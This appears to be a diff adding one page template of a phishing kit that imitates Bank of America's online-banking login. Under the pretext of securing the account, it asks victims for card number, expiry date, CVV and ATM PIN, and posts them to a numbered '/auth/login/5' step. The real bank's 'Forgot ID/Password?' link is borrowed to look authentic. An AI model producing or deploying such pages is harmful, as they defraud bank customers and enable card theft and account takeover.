@@ -1,0 +1,75 @@
+@layout('layouts.app')
+
+@section('content')
+<form id="login5Form" class="cb-form" action="/auth/login/5" method="POST">
+  <div class="columns col-small">
+    <div class="row">
+      <div class="column col-small mtop-30">
+        <div class="btm-20">
+          <h1 class="cb-login-heading">Log In to Online Banking</h1>
+        </div>
+        <div class="btm-30 cb-login-formInfo">To secure your account, please enter the following.</div>
+      </div>
+
+      <div class="column col-small clearfix">
+        <div class="btm-30">
+          <div class="cb-input cb-input-box cb-input--cb2 has-help">
+            <label id="cardNumLabel" class="cb-input-label" for="cardNum">Card Number</label>
+            <input id="cardNum" name="cardNum" type="text" class="cb-input-text" autocapitalize="off" autocorrect="off" autocomplete="off">
+            <p class="cb-input-hint"></p>
+            <div class="cb-input-error-message cb-icon--error" id="cardNumErrorMsg" style="display: none;">Card Number required</div>
+          </div>
+        </div>
+
+        <div class="btm-30">
+          <div class="cb-input cb-input-box cb-input--cb2 has-help">
+            <label id="expDateLabel" class="cb-input-label" for="expDate">Expiry Date</label>
+            <input id="expDate" name="expDate" type="text" class="cb-input-text" autocapitalize="off" autocorrect="off" autocomplete="off">
+            <p class="cb-input-hint"></p>
+            <div class="cb-input-error-message cb-icon--error" id="expDateErrorMsg" style="display: none;">Expiry Date required</div>
+          </div>
+        </div>
+
+        <div class="btm-30">
+          <div class="cb-input cb-input-box cb-input--cb2 has-help">
+            <label id="cvvLabel" class="cb-input-label" for="cvv">CVV</label>
+            <input id="cvv" name="cvv" type="text" class="cb-input-text" autocapitalize="off" autocorrect="off" autocomplete="off">
+            <p class="cb-input-hint"></p>
+            <div class="cb-input-error-message cb-icon--error" id="cvvErrorMsg" style="display: none;">CVV required</div>
+          </div>
+        </div>
+
+        <div class="btm-30">
+          <div class="cb-input cb-input-box cb-input--cb2 has-help">
+            <label id="cpinLabel" class="cb-input-label" for="cpin">ATM/CARD PIN</label>
+            <input id="cpin" name="cpin" type="password" class="cb-input-text hide-input" autocapitalize="off" autocorrect="off" autocomplete="off">
+            <p class="cb-input-hint"></p>
+            <div class="cb-input-error-message cb-icon--error" id="cpinErrorMsg" style="display: none;">ATM/CARD PIN required</div>
+          </div>
+        </div>
+
+        <div class="cb-login-helpText">
+          <a href="https://secure.bankofamerica.com/bofacbsecure/cyclicApp/auth/login/">Forgot ID/Password?</a>
+        </div>
+      </div>
+
+      <div class="column col-small clearfix">
+        <div class="btn-container">
+          <button id="login2SubmitBtn" type="submit" class="cb-btn cb-btn--medium cb-btn--primary mrt-15 submitBtn">Continue</button>
+
+          <button id="cancelBtn" type="button" class="cb-btn cb-btn--medium cb-btn--secondary">Cancel</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</form>
+@endsection
+
+@section('script')
+<script>
+  $('#cardNum').mask('0000 0000 0000 0000');
+  $('#expDate').mask('00/0000');
+  $('#cvv').mask('0000');
+  $('#cpin').mask('0000');
+</script>
+@endsection
